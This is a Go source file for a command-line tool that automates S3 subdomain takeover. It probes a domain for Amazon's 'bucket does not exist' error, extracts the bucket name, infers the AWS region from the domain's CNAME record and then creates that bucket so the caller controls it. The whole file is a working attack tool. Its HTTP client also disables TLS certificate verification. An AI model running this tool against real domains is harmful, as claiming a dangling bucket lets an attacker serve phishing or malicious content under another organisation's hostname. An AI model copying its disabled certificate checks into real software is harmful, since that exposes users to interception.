package main

import (
	"net/http"
	"fmt"
	"crypto/tls"
	"io/ioutil"
	"encoding/xml"
	"time"
    "sync"
    "regexp"
    "errors"
    "strings"
    "os"
	"github.com/aws/aws-sdk-go/aws"
    "github.com/aws/aws-sdk-go/aws/session"
    "github.com/aws/aws-sdk-go/service/s3"
    "github.com/aws/aws-sdk-go/aws/awserr"
    "github.com/miekg/dns"
    "github.com/fatih/color"
)

type NotFoundResponse struct {
    XMLName    xml.Name `xml:"Error" json:"-"`
    Code 	   string   `xml:"Code" json:"Code"`
    Message    string   `xml:"Message" json:"Message"`
    BucketName string   `xml:"BucketName" json:"BucketName"`
    HostId     string   `xml:"HostId" json:"HostId"`
}

var wg sync.WaitGroup

func main() {
	transCfg := &http.Transport {
             TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: transCfg, Timeout: 4 * time.Second,}

    domain := os.Args[1]    

	bucket := runScan("https://" + domain, client)
	if bucket == "" {
		fmt.Println("[*] Failed to connect over HTTPS, trying HTTP...\n")
		bucket = runScan("http://" + domain, client)
	}

	if bucket != "" {
		color.Green("[+] Bucket is vulnerable!\n")
		cnames, err := lookupCNAME(domain)
		if err != nil {
			color.HiRed("[-] Failed to lookup CNAME record... exiting.\n")
			return
		}
		cname := cnames[0]
		region := extractRegionFromCname(cname)
		created, s3err := createBucket(bucket, region, domain)
		if s3err != nil {
			if awsErr, ok := s3err.(awserr.Error); ok {
				logAwsError(awsErr, domain, bucket)
			}
			return
		}

		if created == true {
			color.HiGreen("[+] Bucket successfully created!\n")
			color.Green("Bucket: %q \n", bucket)
			color.Green("Region: %q \n", region)
		} else {
			color.HiRed("[-] Failed to create S3 bucket!\n")
		}
	} else {
		color.HiRed("[-] Bucket does not appear to be vulnerable\n")
	}
}

func runScan(url string, client *http.Client) (string) {
	fmt.Println("[*] Scanning...\n")
	response, err := client.Get(url)
	if err != nil {
		color.Red("[-] Unable to connect to: %q\n", url)
		return ""
	}

	var bucket = ""
	if response.StatusCode == 404 {
		data, err := ioutil.ReadAll(response.Body)
		if err != nil {
			color.Red("[-] Unable to parse HTTP response\n")
			response.Body.Close()
			return bucket
		}
		respText := string(data)
		if strings.Contains(respText, "The specified bucket does not exist") {
			var rawXml = string(data)
			bucket = extractBucketName(rawXml)
		}
	}

	response.Body.Close()
	return bucket
}

func extractBucketName(rawXml string) string {
	var data NotFoundResponse
	xml.Unmarshal([]byte(rawXml), &data)
	return data.BucketName
}

func lookupCNAME(domain string) ([]string, error) {
	var m dns.Msg
	var cnames []string
	m.SetQuestion(dns.Fqdn(domain), dns.TypeCNAME)
	in, err := dns.Exchange(&m, "8.8.8.8:53")
	if err != nil {
		return cnames, err
	}
	if len(in.Answer) < 1 {
		return cnames, errors.New("No Answer")
	}
	for _, answer := range in.Answer {
		if c, ok := answer.(*dns.CNAME); ok {
			cnames = append(cnames, c.Target)
		}
	}
	return cnames, nil
}

func extractRegionFromCname(cname string) string {
	fmt.Printf("%q \n", cname)
	var region = ""
	re := getRegex()
	for _, r := range re {
		if r.MatchString(cname) {
			extract := regexp.MustCompile(`(?:eu|ap|us|ca|sa)-\w{2,14}-\d{1,2}`)
			var match []string
			match = extract.FindStringSubmatch(cname)
			color.Green("[+] Found Region: %s\n", match[0])
			region = match[0]
		}
	}
	if region == "" {
		fmt.Println("[*] Defaulting to us-east-1\n")
		region = "us-east-1"
	}
	return region
}

func getRegex() []*regexp.Regexp {
	return []*regexp.Regexp {
		regexp.MustCompile(`^[a-z0-9\.\-]{3,63}\.s3[\.-](eu|ap|us|ca|sa)-\w{2,14}-\d{1,2}\.amazonaws.com\.$`),
		regexp.MustCompile(`^[a-z0-9\.\-]{0,63}\.?s3.amazonaws\.com\.$`),
		regexp.MustCompile(`^[a-z0-9\.\-]{3,63}\.s3-website[\.-](eu|ap|us|ca|sa|cn)-\w{2,14}-\d{1,2}\.amazonaws.com\.$`),
	}
}

func createBucket(bucket string, region string, domain string) (bool, error) {

	sess, err := session.NewSession(&aws.Config {
	    Region: aws.String(region),
	})	
	if err != nil {
		color.Red("[-] Failed to establish AWS session\n")
		return false, err
	}

	svc := s3.New(sess)
	_, err = svc.CreateBucket(&s3.CreateBucketInput {
		Bucket: aws.String(bucket),
	})
	if err != nil {
		return false, err
	}

	fmt.Printf("[*] Waiting for bucket %q to be created...\n", bucket)
	err = svc.WaitUntilBucketExists(&s3.HeadBucketInput {
		Bucket: aws.String(bucket),
	})
	if err != nil {
		color.Red("[-] Bucket creation request not completed!\n")
		return false, err
	}

	return true, nil
}

func logAwsError(err awserr.Error, domain string, bucket string) {
	color.HiRed("Unexpected AWS Error: \n")
	color.Red("Error Code: %q \n", err.Code())
	color.Red("Error Message: %q \n", err.Message())
	color.Red("Domain: %q \n", domain)
	color.Red("Bucket: %q \n", bucket)
}
